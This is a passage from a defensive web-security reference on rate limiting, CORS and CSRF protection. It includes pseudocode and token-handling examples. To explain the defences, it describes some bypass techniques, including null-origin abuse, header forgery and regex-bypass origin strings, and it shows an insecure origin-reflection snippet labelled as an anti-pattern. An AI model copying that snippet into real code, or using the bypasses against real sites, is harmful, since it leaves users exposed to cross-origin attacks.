Maintains log of request timestamps, counts requests within sliding time window. Precise but memory-intensive—stores timestamp per request. Implementation: use sorted set (Redis ZSET), remove timestamps outside window, count remaining, add new timestamp. Memory grows linearly with rate limit and window size.

**Sliding Window Counter**

Hybrid approach combining fixed windows with weighted calculation. Maintains current and previous window counts. Calculate allowed requests based on overlap percentage. Formula: `previous_count * (1 - elapsed_percent) + current_count`. Approximation of sliding window log with O(1) memory. Acceptable precision loss for most security use cases.

### Identifier Strategy

**IP-Based Limiting**

Rate limit by source IP address. Vulnerable to false positives behind NAT, corporate proxies, VPNs—thousands of legitimate users share single IP. Implement tiered limits: stricter for unauthenticated, relaxed for authenticated users. Use X-Forwarded-For header only when behind trusted proxy—validate proxy IP against whitelist, take rightmost untrusted IP.

**User/Account-Based Limiting**

Rate limit authenticated users by user ID or account ID. Prevents abuse by authenticated actors. Critical for APIs requiring authentication. Combine with IP-based limiting—enforce both, reject if either threshold exceeded. Different limits per user tier (free, premium, enterprise).

**API Key Rate Limiting**

Each API key has dedicated rate limit quota. Enables precise control per client application. Store limits in fast key-value store (Redis) with key pattern `ratelimit:apikey:{key_id}`. Support burst and sustained rate limits simultaneously. Implement key-specific limits overriding defaults.

**Composite Identifiers**

Combine multiple dimensions: `IP:user_id`, `IP:endpoint`, `user_id:endpoint`. Prevents single attack vector exploitation. Example: limit password reset to 3/hour per IP AND 5/hour per account prevents both credential stuffing and account-specific attacks. Increase memory footprint but critical for high-security endpoints.

### Distributed Rate Limiting

**Centralized Counter Store**

Use Redis, Memcached, or similar for atomic counter operations. Redis INCR/EXPIRE provides race-condition-free counting. Lua scripting enables atomic multi-operation rate limit checks. Single point of failure—implement Redis Cluster or Sentinel for high availability. Network latency impacts request latency—co-locate rate limit store with application servers.

**Race Condition Handling**

Race conditions occur in distributed systems—multiple servers check limit simultaneously before incrementing. Use atomic operations (Redis INCR returns new value, compare against threshold). Implement optimistic locking with versioned counters. Pessimistic locking (distributed locks) adds latency, avoid for high-throughput paths.

**Eventual Consistency Trade-offs**

Strongly consistent rate limiting requires distributed coordination (latency penalty). Eventually consistent approaches may temporarily exceed limits during propagation. Acceptable for most security use cases—brief limit excess (milliseconds) versus attack sustained minutes/hours. Set limits 10-20% below true threshold to account for consistency lag.

**Local Approximation**

Maintain local counters per application instance, periodically sync to central store. Reduces central store load, improves latency. Accuracy degrades with instance count—each instance may allow full limit before sync. Formula: `central_limit / instance_count = per_instance_limit`. Suitable for coarse-grained limits (hourly, daily), problematic for fine-grained (per-second).

### Response Strategies

**HTTP Status Codes**

Return 429 Too Many Requests with Retry-After header indicating seconds until retry allowed. Include X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Reset headers following de facto standard. Critical: always return 429, never 503 or 500—enables client differentiation between rate limiting and server errors.

**Exponential Backoff Guidance**

Provide explicit backoff guidance in response headers or body. Recommend exponential backoff with jitter for retries. Example header: `X-RateLimit-Backoff: exponential,base=2,max=300`. Prevents thundering herd when many clients hit limit simultaneously.

**Graceful Degradation**

For non-critical operations, allow degraded functionality instead of hard rejection. Example: reduce data granularity, return cached results, limit result set size. Distinguish essential endpoints (authentication, critical transactions) from non-essential (analytics, recommendations).

**Cost-Based Rate Limiting**

Assign cost weights to endpoints based on computational expense, abuse risk. Expensive operations (search, complex queries, file uploads) consume more rate limit quota than cheap operations (simple lookups). Implement two-tier system: request count limit AND cost-weighted limit. Prevents resource exhaustion through expensive endpoint abuse.

### Endpoint-Specific Patterns

**Authentication Endpoints**

Aggressive rate limiting: 5-10 attempts per 15 minutes per IP, 3-5 attempts per account per hour. Implement progressive delays: first failure immediate response, subsequent failures add delay (100ms, 500ms, 2s, 5s). After threshold, temporary account lock (15-60 minutes) with notification to account owner. Different limits for different authentication stages (username/password, MFA, recovery).

**Password Reset**

Strict limits prevent account enumeration and DoS: 3 requests per hour per IP, 1 request per 15 minutes per account. Send email regardless of account existence (timing attack mitigation). Rate limit password reset token validation attempts separately—prevents brute force token guessing.

**API Endpoints**

Tiered limits based on endpoint criticality and cost. Read operations: 1000-5000/hour. Write operations: 100-1000/hour. Expensive operations (search, aggregation): 50-500/hour. Administrative operations: 10-100/hour. Implement separate limits for authenticated vs unauthenticated access.

**File Upload**

Rate limit by request count AND total bytes uploaded. Example: 10 uploads per hour AND 100MB per hour per user. Prevents storage exhaustion attacks. Implement file size validation before rate limit check—reject oversized files immediately. Separate limits for different file types based on processing cost.

**GraphQL/Flexible Query APIs**

Query complexity analysis required—rate limit by complexity score, not request count. Calculate complexity: field count, nesting depth, collection sizes, resolver costs. Reject queries exceeding complexity threshold before execution. Implement query cost caching for identical queries. Different complexity budgets per user tier.

### Bypass and Whitelist Mechanisms

**IP Whitelist**

Maintain whitelist of trusted IPs (internal systems, monitoring, trusted partners). Store in fast-access data structure (hash set, Bloom filter). Update mechanism separate from deployment cycle. Audit whitelist entries regularly—remove unused entries. Document business justification for each whitelist entry.

**Dynamic Whitelist**

Automatically whitelist IPs with proven good behavior over time. Criteria: account age, successful transactions, no abuse indicators. Probabilistic approach: reduce rate limit strictness proportional to trust score. Remove from whitelist immediately on suspicious activity detection.

**Emergency Override**

Implement emergency rate limit bypass for critical situations (legitimate traffic surge, business-critical operations). Require multi-party approval (2-3 authorized personnel). Temporary duration (1-24 hours). Comprehensive logging of override activation, deactivation, approvers. Automated expiration prevents forgotten overrides.

**Bot Detection Integration**

Integrate CAPTCHA, reCAPTCHA, or behavioral analysis after rate limit hit. Legitimate users solve challenge, gain temporary rate limit increase. Automated bots fail challenge, remain rate-limited or blocked. Implement challenge difficulty escalation—harder challenges after multiple failed attempts.

### Monitoring and Alerting

**Metrics Collection**

Track rate limit hits per identifier, per endpoint, globally. Calculate hit rate percentage (hits / total requests). Monitor rate limit effectiveness—high hit rate indicates legitimate traffic affected, adjust limits upward. Low hit rate with attack traffic present indicates limits too permissive. Histogram of requests per identifier reveals distribution patterns.

**Anomaly Detection**

Baseline normal traffic patterns (hourly, daily, weekly cycles). Alert on significant deviations: sudden spike in rate limit hits, new IP ranges generating high traffic, geographically unusual traffic patterns. Machine learning models detect sophisticated attacks—gradual ramp-up, distributed sources, mimicking legitimate patterns.

**Attack Pattern Recognition**

Signature-based detection: distributed credential stuffing (many IPs, sequential usernames), account enumeration (systematic username testing), API scraping (predictable access patterns). Behavioral analysis: request timing patterns, user-agent anomalies, header inconsistencies. Correlate across multiple identifiers—same attack campaign from different IPs.

**Response Time Correlation**

Monitor application response times—degradation correlates with attack traffic. Rate limit effectiveness measured by response time stability under attack. High rate limit hit rate but stable response times indicates effective protection. Response time degradation despite rate limiting indicates limits insufficient or attack bypassing rate limiter.

### Evasion Prevention

**Distributed Attacks**

Attackers use botnets, proxy networks to distribute requests across many IPs. Implement global rate limits in addition to per-IP limits. Example: 1000 requests/minute per IP AND 50,000 requests/minute globally. Detect coordinated patterns—many IPs targeting same endpoint, similar user-agents, timing correlation. Aggregate rate limiting across IP ranges (CIDR blocks) for network-level enforcement.

**Identifier Rotation**

Attackers rotate IPs, user-agents, API keys to evade rate limits. Implement fingerprinting beyond stated identifiers: TLS fingerprint (cipher suites, extensions), TCP fingerprint (window size, options), behavioral fingerprint (timing patterns, navigation flow). Probabilistic identifiers (device fingerprinting) supplement but never replace explicit rate limiting—false positive considerations.

**Slow-Rate Attacks**

Attackers stay just below rate limit threshold, sustaining attack over longer duration. Implement multiple time windows simultaneously—per minute, per hour, per day. Aggregate impact detection—many slow attackers collectively cause damage. Cost-based limiting critical—expensive operations exploited by slow-rate attacks.

**Header Manipulation**

Attackers forge X-Forwarded-For, X-Real-IP headers to appear as different clients. Only trust headers from verified proxy sources—whitelist trusted proxy IPs. Extract client IP from rightmost untrusted hop in X-Forwarded-For. Implement strict header validation—reject malformed or suspicious headers. Alternative: use true client IP from TCP connection, ignore headers.

### Performance Optimization

**In-Memory Caching**

Cache rate limit state in application memory (TTL 1-60 seconds) before checking centralized store. Reduces latency and central store load. Accuracy trade-off—may briefly exceed limits during cache TTL. Acceptable for high-throughput, low-security endpoints. Critical endpoints bypass cache.

**Write-Behind Pattern**

Asynchronously update centralized rate limit store after request processing. Optimistic approach—assume limit not exceeded, process request immediately, async check/update limits. Risk: brief period of limit excess if async update fails. Implement compensating transactions—revoke action if limit check fails post-processing.

**Bloom Filters for Blacklists**

Use Bloom filter for fast blacklist lookup (blocked IPs, tokens). Probabilistic data structure: no false negatives, rare false positives. Memory-efficient for large blacklists. False positive handling: secondary authoritative check on Bloom filter match. Periodic rebuild as blacklist changes.

**Connection Pooling**

Maintain persistent connections to rate limit store (Redis). Avoid connection overhead per request. Pool sizing critical—insufficient connections cause queuing, excessive connections waste resources. Monitor connection pool utilization, adjust based on request rate.

### Compliance and Legal Considerations

**Fair Use Preservation**

Rate limits must not prevent legitimate use cases. Conduct usage analysis before implementing limits—understand 95th, 99th percentile legitimate usage. Set limits above normal usage peaks with buffer. Provide clear documentation of limits, guidance for staying within limits.

**Terms of Service Enforcement**

Rate limits enforce ToS "acceptable use" clauses. Legal foundation for blocking abusive traffic. Document rate limits in API documentation, developer agreements. Provide mechanism for appealing rate limit decisions. Graduated enforcement—warning, temporary restriction, permanent ban.

**Data Privacy**

Rate limit logging includes PII (IP addresses, user IDs, request parameters). Implement data retention policies—purge logs after defined period. Anonymize or pseudonymize identifiers in long-term storage. GDPR/CCPA considerations—users may request deletion of rate limit logs.

### Testing Strategies

**Load Testing**

Verify rate limit enforcement under load. Generate traffic exceeding limits from single and multiple sources. Measure false positive rate—legitimate requests incorrectly blocked. Measure false negative rate—attack traffic incorrectly allowed. Validate distributed rate limiting consistency across application instances.

**Penetration Testing**

Attempt rate limit bypass techniques: identifier rotation, header manipulation, timing attacks, edge case exploitation (window boundaries). Test emergency override mechanisms—verify proper authorization, logging, expiration. Validate graceful degradation under sustained attack.

**Chaos Engineering**

Simulate rate limit store failures (Redis crash, network partition). Verify application behavior—fail open (allow all) or fail closed (block all). Implement circuit breakers—temporary local rate limiting on store unavailability. Test rate limit store recovery—state synchronization, no permanent limit bypass.

**Related Topics:** DDoS Mitigation Patterns, Throttling vs Rate Limiting, Token Bucket Implementation, Distributed Systems Consistency, CAPTCHA Integration, Bot Detection, API Gateway Patterns, Circuit Breaker Pattern

---

## CORS Patterns

### Origin Validation

**Exact Origin Matching**

Maintain allowlist of fully-qualified origins: `https://app.example.com`, `https://admin.example.com`. Never use wildcards in production for sensitive endpoints. Validate protocol (https only), domain, and port. Reject partial matches—`evil-example.com` must not match `example.com`.

**Dynamic Origin Validation**

Query database/configuration service for permitted origins per tenant/client. Cache validation results with TTL based on configuration change frequency. Key cache by origin string: `cors:allowed:{origin_hash} -> boolean`. Prevents database query per preflight request.

**Subdomain Wildcarding**

Pattern matching `*.example.com` requires careful implementation. Extract domain from origin, validate against regex `^https://[\w-]+\.example\.com$`. Reject empty subdomain, path components, or additional domains: `https://example.com.attacker.com`.

**Null Origin Handling**

Browsers send `Origin: null` for file://, data:, sandboxed iframes. Never allow `null` in production. Local development only, with explicit environment checks. Attackers exploit null origins via sandboxed iframes to bypass CORS.

### Credential Handling

**Access-Control-Allow-Credentials**

Set to `true` only when cookies/authentication required. Forces origin allowlist—cannot combine with wildcard `*`. Browser rejects credentials if origin not explicitly allowed.

**Cookie Security Attributes**

Combine CORS with strict cookie policies:

- `SameSite=Strict` or `SameSite=Lax`: Mitigates CSRF when CORS misconfigured
- `Secure`: HTTPS only, prevents plaintext transmission
- `HttpOnly`: JavaScript access blocked, reduces XSS impact
- `Domain` and `Path`: Narrow cookie scope to minimum required

**Token-Based Authentication**

Prefer Authorization headers over cookies for cross-origin requests. Custom headers trigger preflight, providing additional validation opportunity. Tokens in headers avoid automatic credential inclusion, requiring explicit JavaScript to add—reduces confused deputy risks.

### Preflight Request Optimization

**Access-Control-Max-Age**

Cache preflight responses: `86400` (24 hours) or `7200` (2 hours) based on policy change frequency. Reduces OPTIONS request overhead. Browsers enforce maximum cache duration regardless of header value (browser-dependent: 5 seconds to 24 hours).

**Preflight Caching Strategy**

Server-side cache preflight validation results: `preflight:{origin}:{method}:{headers_hash} -> {allowed_boolean, cache_timestamp}`. Avoids repeated policy evaluation for identical requests. Invalidate on CORS policy updates.

**Simple Request Avoidance**

Design APIs to avoid preflight where latency critical:

- Use GET/POST/HEAD methods only
- Limit Content-Type to `application/x-www-form-urlencoded`, `multipart/form-data`, `text/plain`
- Avoid custom headers beyond CORS-safelisted set

Trade-off: REST semantics vs. performance. Simple requests skip preflight but limit expressiveness.

**Preflight-Only Endpoints**

Separate OPTIONS handling from resource endpoints. Validate CORS policy, return appropriate headers, avoid business logic execution. Prevents accidental side effects from preflight requests if routing misconfigured.

### Header Configuration

**Access-Control-Allow-Methods**

Specify exact methods permitted: `GET, POST, PUT, DELETE`. Never use `*` wildcard—grants OPTIONS, TRACE, CONNECT unexpectedly. Validate incoming method in actual request against allowed set; OPTIONS preflight and actual request method validation are separate.

**Access-Control-Allow-Headers**

Enumerate required custom headers explicitly: `Authorization, Content-Type, X-Request-ID`. Reject wildcard `*` except non-credentialed public endpoints. Browser sends `Access-Control-Request-Headers` in preflight—respond with subset actually permitted.

**Access-Control-Expose-Headers**

API responses with custom headers (pagination tokens, rate limit counters) require explicit exposure: `X-Total-Count, X-RateLimit-Remaining`. JavaScript cannot access unexposed headers even if received. Default exposed: `Cache-Control, Content-Language, Content-Type, Expires, Last-Modified, Pragma`.

**Vary Header**

Include `Vary: Origin` in responses to prevent cache poisoning. CDN/proxy caches must key by Origin header, preventing one origin's response served to another. Critical when CORS headers differ by origin.

### Security Hardening

**Defense in Depth**

CORS is authorization, not authentication. Always validate:

- Authentication tokens in actual request
- Request origin matches expected patterns
- CSRF tokens for state-changing operations
- Input validation regardless of origin

CORS bypass doesn't grant API access if authentication enforced.

**Preflight Validation Binding**

Validate actual request against preflight approval. Store preflight decisions: `preflight:{origin}:{request_id} -> {allowed_methods, allowed_headers, expires_at}`. Match actual request method/headers to preflight grant. Prevents preflight approval for GET exploited for POST.

[Inference] This pattern requires custom implementation beyond standard CORS middleware. Most frameworks don't bind preflight to subsequent requests.

**Origin Header Spoofing**

Server-to-server requests can forge Origin header. CORS protects browsers only—server clients bypass. Never rely on CORS for server authentication. Validate API keys, OAuth tokens, mutual TLS for server clients.

**Browser Quirks**

Different browsers implement CORS inconsistently:

- Credential handling edge cases vary (Safari, Chrome differences)
- Maximum preflight cache duration varies
- Error reporting granularity differs

Test critical flows across browsers. Monitor CORS errors via `SecurityError` exceptions logged client-side.

### Multi-Origin Support

**Multiple Domain Support**

Single origin header per request. Respond with requesting origin if in allowlist, not all allowed origins. Avoid listing multiple origins in `Access-Control-Allow-Origin`—spec violation, browsers reject.

```
if (allowed_origins.contains(request.origin)) {
  response.set_header("Access-Control-Allow-Origin", request.origin)
}
```

**Environment-Based Configuration**

Separate origin allowlists: development (`localhost:*`), staging (`*.staging.example.com`), production (`app.example.com`). Load from environment variables or configuration service. Never commit production origins to version control alongside development wildcards—prevents accidental production exposure.

**Tenant-Specific Origins**

Multi-tenant SaaS with custom domains per tenant. Lookup allowed origins by tenant ID extracted from hostname, JWT, or API key. Cache tenant-origin mappings: `tenant:{tenant_id}:cors:origins -> [origin1, origin2]`. Invalidate on tenant configuration updates.

### CDN and Proxy Considerations

**Cache Key Normalization**

CDNs cache by URL + selected headers. `Vary: Origin` ensures per-origin caching but reduces cache hit rate. Balance security vs. performance:

- Public endpoints: Single CORS policy, no Vary needed
- Authenticated endpoints: Vary by Origin, accept cache hit rate reduction

**Proxy Header Forwarding**

Reverse proxies must forward `Origin` header to upstream. Load balancers stripping headers break CORS validation. Configure X-Forwarded-Host preservation, validate against forwarded origin at application layer.

**CDN Origin Response Timing**

CDN cache miss for preflight OPTIONS requests adds latency. Configure CDN to cache OPTIONS responses based on `Access-Control-Max-Age`. Short-circuit CDN for certain origins (internal tooling) if latency unacceptable.

### Microservices Architecture

**API Gateway CORS Enforcement**

Centralize CORS policy at gateway layer. Upstream services operate in trusted zone, no CORS headers needed. Gateway validates origin, adds appropriate headers, routes to backend. Simplifies policy management, prevents inconsistencies across services.

**Per-Service CORS Policies**

Services with distinct security requirements enforce individual policies. User service allows `app.example.com`; admin service allows `admin.example.com` only. Gateway routes based on origin, delegates CORS to service. Distributed policy management requires configuration synchronization.

**Service Mesh Integration**

Envoy/Istio enforce CORS at sidecar proxy. Configure via CRDs or configuration files. Advantages: language-agnostic, consistent enforcement, centralized policy updates. Disadvantage: adds network hop, complexity in debugging.

### Anti-Patterns

**Wildcard Origin in Production**

`Access-Control-Allow-Origin: *` permits any origin. Acceptable only for public, unauthenticated, read-only endpoints. Never combine with credentials. Attackers embed malicious JavaScript reading sensitive API responses.

**Reflecting Origin Header**

```
response.set_header("Access-Control-Allow-Origin", request.origin)
```

Without validation, allows arbitrary origins. Common vulnerability in middleware misconfiguration. Always validate origin against allowlist before reflecting.

**Regex Validation Bypass**

Incorrect regex: `.*\.example\.com` matches `evil.com?x=.example.com`. Use anchored patterns: `^https://[\w-]+\.example\.com$`. Test regex against malicious inputs: null bytes, URL encoding, unicode homographs.

**CORS as Primary Security**

CORS mitigates browser-based attacks only. Server-to-server, mobile apps, curl bypass CORS. Implement authentication, authorization, rate limiting, input validation independent of CORS.

**Overly Permissive Headers**

Allowing all headers via `Access-Control-Allow-Headers: *` grants access to sensitive custom headers. Enumerate headers explicitly. Review header allowlist quarterly—remove unused headers.

**Ignoring Preflight Failures**

Silent preflight failure (no logs, monitoring) hides attacks or misconfigurations. Log all rejected preflight requests with origin, method, headers, timestamp. Alert on unusual patterns—spike in rejected origins.

**Credentials Without Origin Validation**

Setting `Access-Control-Allow-Credentials: true` with wildcard or weak origin validation. Browser permits but exposes credentials to any origin. Combine credentials with strict origin allowlist only.

### Advanced Patterns

**CORS Policy Versioning**

Version CORS configurations: `cors_policy_v1`, `cors_policy_v2`. Deploy new policy version, monitor error rates, rollback if needed. Gradual rollout: canary deployments with 5% traffic to new policy, expand if successful.

**Dynamic Header Negotiation**

Client requests specific headers in preflight. Server responds with intersection of requested and allowed headers. Reduces configuration coupling—client evolves independently, server grants minimum required access.

**Rate Limiting Preflight Requests**

Attackers spam OPTIONS requests probing CORS policies. Implement preflight-specific rate limits: 100 requests/minute per IP. Lower than actual endpoint limits—preflight cheaper but still consumes resources.

**CORS Monitoring and Alerting**

Track metrics:

- Preflight request volume and rejection rate
- Actual request CORS failures
- Top rejected origins (potential attacks)
- Header allowlist utilization (identify unused headers)

Alert on anomalies: sudden spike in rejected origins, new origin patterns, unusual header combinations.

**Content Security Policy Integration**

CSP `connect-src` directive restricts fetch/XHR destinations. Combine with CORS for defense in depth:

- CSP blocks outbound requests to disallowed origins (client-side enforcement)
- CORS blocks inbound requests from disallowed origins (server-side enforcement)

Misalignment between CSP and CORS policies creates confusion—synchronize policies.

**Subresource Integrity (SRI)**

When loading JavaScript from CORS-enabled CDNs, use SRI hashes. Prevents CDN compromise from injecting malicious code. CORS permits cross-origin loads; SRI validates content integrity.

```html
<script src="https://cdn.example.com/lib.js"
        integrity="sha384-hash..."
        crossorigin="anonymous"></script>
```

**CORS Error Standardization**

Browsers provide minimal CORS error details to prevent information leakage. Server logs capture full context:

- Rejected origin
- Attempted method
- Requested headers
- Reason for rejection (not in allowlist, credential mismatch, etc.)

Structured logging enables security monitoring, troubleshooting legitimate failures.

### Caching Patterns for CORS Validation

**Origin Allowlist Caching**

Cache allowed origin set in application memory or distributed cache. TTL based on configuration change frequency: 5-15 minutes typical. Cache key: `cors:allowed_origins:v{config_version}`. Version prefix enables instant invalidation on policy updates.

**Preflight Response Caching**

Cache complete preflight response per origin: `cors:preflight:{origin} -> {headers, status, timestamp}`. Serves identical preflight requests from cache, avoids policy re-evaluation. TTL matches `Access-Control-Max-Age`.

**Validation Result Caching**

Cache boolean validation outcome: `cors:valid:{origin}:{method} -> {allowed: true, ttl: 300}`. Faster than reconstructing full response. Separate cache for denied origins with shorter TTL (30-60 seconds) to prevent cache exhaustion from attack traffic.

**Tenant-Origin Mapping Cache**

Multi-tenant systems cache tenant-to-allowed-origins mapping: `tenant:{id}:cors -> [origins]`. Reduces database queries. Invalidate on tenant configuration updates via event-driven cache eviction (pub/sub).

**Cache Invalidation Strategies**

- **Time-based expiry**: 5-15 minutes for standard configurations
- **Event-driven**: Configuration change triggers cache flush via message queue
- **Versioned keys**: Increment configuration version, old keys auto-expire
- **Tag-based**: Tag cache entries by tenant/service, bulk invalidate by tag

**Distributed Cache Coherence**

Use Redis hash tags to co-locate CORS data: `{cors}:allowed_origins`, `{cors}:preflight:{origin}`. Reduces cross-node lookups in clustered deployments. Implement read-through pattern: cache miss loads from configuration store, populates cache, returns result.

**Related Topics**

Content Security Policy (CSP), Subresource Integrity (SRI), Cross-Site Request Forgery (CSRF) protection, Same-Origin Policy enforcement, OAuth2 CORS considerations, Credential Management API, Fetch API security, preflight request optimization, API gateway security patterns, Zero Trust network architecture

---

## CSRF Protection

### Attack Mechanism

Cross-Site Request Forgery exploits authenticated sessions to execute unauthorized state-changing operations. Attacker embeds malicious requests in third-party sites, emails, or ads. Victim's browser automatically includes authentication credentials (cookies, HTTP auth headers) with cross-origin requests, causing server to accept forged requests as legitimate.

**Prerequisites for successful CSRF**:

- Victim has active authenticated session with target application
- Application relies solely on automatically-attached credentials (cookies, HTTP auth)
- Attacker can predict request structure (URL, parameters, headers)
- Application accepts state-changing requests via GET or performs insufficient validation on POST

**Attack vectors**:

- HTML forms with hidden fields auto-submitted via JavaScript
- IMG, SCRIPT, IFRAME tags triggering GET requests
- XMLHttpRequest/Fetch API from attacker-controlled origins (limited by CORS)
- DNS rebinding attacks bypassing same-origin policy

### Synchronizer Token Pattern

Server generates cryptographically random token, binds to user session, embeds in forms and Ajax requests. Server validates token presence and correctness on state-changing operations.

**Implementation requirements**:

- **Token generation**: Use CSPRNG (crypto.randomBytes, SecureRandom) with minimum 128 bits entropy. Avoid timestamp-based or sequential tokens.
- **Token binding**: Associate token with server-side session. Store mapping in session store (Redis, database) or encode session ID + HMAC into token.
- **Token lifetime**: Match session lifetime. Regenerate on privilege escalation or sensitive operations.
- **Token scope**: Per-session (single token for all requests) or per-request (unique token per form/Ajax call). Per-request provides stronger protection but increases complexity.
- **Validation logic**: Extract token from request (header, form parameter). Compare with session-bound expected value using constant-time comparison to prevent timing attacks.

**Token delivery mechanisms**:

- **Form hidden field**: `<input type="hidden" name="csrf_token" value="{token}">`. Server-side template injection.
- **Meta tag**: `<meta name="csrf-token" content="{token}">`. JavaScript extracts and includes in Ajax requests.
- **Custom HTTP header**: `X-CSRF-Token: {token}`. JavaScript reads from cookie or meta tag, attaches to requests. Requires JavaScript access to token.
- **Double-submit cookie**: Token stored in cookie AND request parameter. Server validates match without session lookup.

**Per-request tokens**:

- Generate unique token for each form render or Ajax request
- Store tokens in session with timestamp and operation identifier
- Validate and immediately consume token (use-once pattern)
- Maintain token pool with TTL to handle back button and multiple tabs
- Implement token pool size limits (100-1000 tokens) to prevent memory exhaustion

**Anti-patterns**:

- Predictable token generation (sequential numbers, MD5 of user ID)
- Same token across all users (defeats entire protection)
- No token regeneration after authentication or privilege changes
- Token validation using string equality instead of constant-time comparison
- Accepting token from any source (must come from trusted channel)
- No token expiration allowing indefinite reuse
- Exposing token in URL query parameters (logged in proxies, browser history)

### Double Submit Cookie Pattern

Token stored in cookie; client submits same value in request header or body. Server validates match without server-side state. Relies on attacker inability to read/write victim's cookies due to same-origin policy.

**Implementation considerations**:

- **Cookie attributes**: Set `SameSite=Strict` or `Lax`, `Secure`, `HttpOnly=false` (JavaScript needs read access). Path and Domain tightly scoped.
- **Token format**: 32+ random bytes, Base64 encoded. Optionally HMAC with server secret for integrity.
- **Validation**: Extract token from cookie and request parameter/header. Verify exact match using constant-time comparison.
- **Token rotation**: Regenerate on login and privilege escalation. Optional rotation on each request for stronger protection.
- **Subdomain isolation**: Prevents subdomain attackers from overwriting parent domain cookies. Use `__Host-` cookie prefix to enforce Secure and Path=/.

**Signed double-submit variant**:

- Token = HMAC(secret, session_id || timestamp)
- Server validates HMAC signature instead of comparing against stored value
- Eliminates server-side storage requirement
- Timestamp enables token expiration without session lookup
- Secret must be application-wide or per-user to prevent token reuse across accounts

**Encrypted token variant**:

- Token = AES_Encrypt(secret, session_id || timestamp || nonce)
- Server decrypts and validates session binding and expiration
- Prevents token prediction even with known plaintexts
- Requires key rotation strategy for compromised secrets

**Anti-patterns**:

- Cookie without `SameSite` attribute (vulnerable to cross-site requests)
- Cookie with `HttpOnly=true` (JavaScript cannot read token for Ajax requests)
- Cookie scoped to parent domain (subdomain attackers can overwrite)
- No integrity protection (HMAC/signature) allowing token tampering
- Accepting token from cookie only without request parameter validation
- Using session cookie as CSRF token (defeats purpose, doesn't prove intent)

### SameSite Cookie Attribute

Browser-enforced CSRF defense. Restricts cookie transmission to same-site requests, preventing cross-site request forgery without application-level token validation.

**Values**:

- **Strict**: Cookie never sent on cross-site requests, even navigation from external sites. Strongest protection but breaks legitimate cross-site navigation (user clicks link from email).
- **Lax**: Cookie sent on top-level navigation via safe methods (GET). Omitted on cross-site POST, iframe, AJAX. Balances security and usability.
- **None**: Cookie sent on all cross-site requests. Requires `Secure` attribute. Used for intentional cross-site scenarios (OAuth, payment gateways).

**Browser compatibility**:

- Chrome 80+, Firefox 69+, Safari 12+ support SameSite
- Older browsers treat SameSite as invalid attribute, ignore directive
- Default behavior varies: Chrome defaults to `Lax` (2020+), others default to `None`

**Implementation strategy**:

- Set `SameSite=Lax` for session cookies on public-facing applications
- Set `SameSite=Strict` for highly sensitive applications accepting broken external navigation
- Explicitly set `SameSite=None; Secure` for intentional cross-site cookies
- Deploy defense-in-depth: SameSite + synchronizer tokens for legacy browser support

**Edge cases**:

- Top-level POST from external site: Lax blocks, use Strict or synchronizer tokens
- Iframe embedding: Both Lax and Strict block cookies in cross-site iframes
- CORS requests: SameSite evaluated independently from CORS; both must permit request
- Redirect chains: SameSite evaluated on final target origin, not intermediate redirects

**Anti-patterns**:

- Relying solely on SameSite without token validation (incomplete browser support)
- Setting `SameSite=None` without `Secure` (browsers reject)
- Inconsistent SameSite across session and CSRF cookies
- Not testing cross-site navigation flows after enabling SameSite
- Using SameSite=Strict on sites requiring external referrals

### Custom Request Headers

Require custom header (e.g., `X-Requested-With: XMLHttpRequest`) on state-changing requests. Simple Requests (GET/POST with standard content types) omit CORS preflight, but custom headers trigger preflight, which attacker cannot forge cross-origin.

**Implementation**:

- Server rejects state-changing requests lacking custom header
- Client-side code (JavaScript) attaches header to all Ajax requests
- Framework-level integration: Axios interceptors, jQuery ajaxSetup, Fetch API wrapper

**Verification logic**:

```
if request.method in ['POST', 'PUT', 'DELETE', 'PATCH']:
    if not request.headers.get('X-Custom-Header'):
        return 403
```

**Limitations**:

- Protects only Ajax requests, not traditional form submissions
- Requires JavaScript; inaccessible forms lack protection
- Flash/Java applets can set custom headers (legacy attack vector, mostly irrelevant today)
- Does not protect against compromised subdomains on same site

**Advantages**:

- Stateless validation (no server-side token storage)
- Simple implementation
- Framework/library support (most Ajax libraries add X-Requested-With automatically)

**Anti-patterns**:

- Accepting standard headers like `Content-Type` as validation (can be forged)
- Not protecting non-Ajax endpoints (form submissions)
- Checking header presence without verifying specific expected value
- Using header check as sole protection for highly sensitive operations

### Origin and Referer Header Validation

Validate `Origin` or `Referer` headers match trusted domains. Rejects requests originating from attacker-controlled sites.

**Origin header**:

- Sent on POST, PUT, DELETE, PATCH requests and CORS preflights
- Contains scheme + host + port (e.g., `https://example.com:443`)
- Cannot be altered by JavaScript in browsers (browser-controlled header)
- Not sent on same-origin GET requests or some redirect scenarios

**Referer header**:

- Sent on navigation and subresource requests
- Contains full URL including path and query
- Can be suppressed via Referrer-Policy or user privacy settings
- Less reliable than Origin (more scenarios where absent)

**Validation logic**:

```
allowed_origins = ['https://example.com', 'https://app.example.com']
origin = request.headers.get('Origin')
referer = request.headers.get('Referer')

if origin:
    if origin not in allowed_origins:
        return 403
elif referer:
    if not any(referer.startswith(o) for o in allowed_origins):
        return 403
else:
    # Neither header present - reject or require token validation
    return 403
```

**Considerations**:

- **Referrer-Policy**: Users or pages may suppress Referer. Set `Referrer-Policy: strict-origin-when-cross-origin` to ensure header sent on same-origin requests.
- **HTTPS required**: Browsers strip Referer when navigating HTTPS→HTTP. Enforce HTTPS-only to maintain header presence.
- **Subdomain handling**: Validate exact origin match or allow specific subdomain patterns with explicit allowlist.
- **Null origin**: Some privacy extensions or sandboxed iframes send `Origin: null`. Reject null origins unless specific use case requires.

**Anti-patterns**:

- Accepting missing Origin/Referer as valid (bypasses protection entirely)
- Substring matching without scheme validation (allows `http://example.com.attacker.com`)
- Not handling HTTPS→HTTP downgrades
- Relying solely on Referer (unreliable due to privacy controls)
- Overly permissive subdomain wildcards (*.example.com includes attacker-registered subdomains)

### Token-Per-Action Pattern

Generate unique token per operation type (delete_user, transfer_funds). Tokens non-transferable between actions, limiting blast radius of token compromise.

**Implementation**:

- Token format: HMAC(secret, session_id || action_name || timestamp)
- Embed action identifier in token cryptographically
- Validate token corresponds to requested action
- Maintain separate token pools per action category

**Token generation**:

```
def generate_action_token(session_id, action, secret):
    timestamp = int(time.time())
    message = f"{session_id}:{action}:{timestamp}"
    signature = hmac.new(secret, message.encode(), hashlib.sha256).hexdigest()
    token = base64.b64encode(f"{message}:{signature}".encode())
    return token
```

**Validation**:

```
def validate_action_token(token, session_id, action, secret, max_age=3600):
    decoded = base64.b64decode(token).decode()
    message, signature = decoded.rsplit(':', 1)
    expected_sig = hmac.new(secret, message.encode(), hashlib.sha256).hexdigest()
    
    if not hmac.compare_digest(signature, expected_sig):
        return False
    
